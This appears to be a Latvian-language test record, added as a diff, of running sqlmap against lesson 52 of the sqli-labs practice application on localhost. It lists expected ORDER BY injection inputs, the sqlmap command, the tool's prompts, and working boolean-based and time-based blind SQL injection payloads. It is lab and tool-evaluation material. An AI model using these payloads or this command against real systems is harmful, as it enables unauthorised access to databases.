@@ -1,0 +1,34 @@
+=================================================================================
+1. Īpašība: injicets tiek "order by" klauzulā
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?sort=-1 or 1=1
+3.2. error-based: ?sort=-1'
+3.3. time-based: ?sort=-1 or sleep(1)
+3.4. union: -
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 188117 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://localhost/sqli-labs/sqli-labs/Less-52/?sort=-1" -p sort --risk=3 --level=5 
+
+
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it appears that you have provided tainted parameter value ('sort=-1') with most likely leftover chars/statements from manual SQL injection test(s). Please, always use only valid parameter values so sqlmap could be able to run properly
+are you really sure that you want to continue (sqlmap could have problems)? [y/N] y
+7.2. it look like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.3. GET parameter 'sort' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 784 HTTP(s) requests:
+---
+Parameter: sort (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: sort=-1 AND 5107=(SELECT (CASE WHEN (5107=5107) THEN 5107 ELSE (SELECT 4996 UNION SELECT 5176) END))-- jHYs
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: sort=-1 AND (SELECT 6332 FROM (SELECT(SLEEP(5)))GKcz)
+---
+web application technology: PHP 5.6.40, Apache 2.4.38
+back-end DBMS: MySQL >= 5.0.12
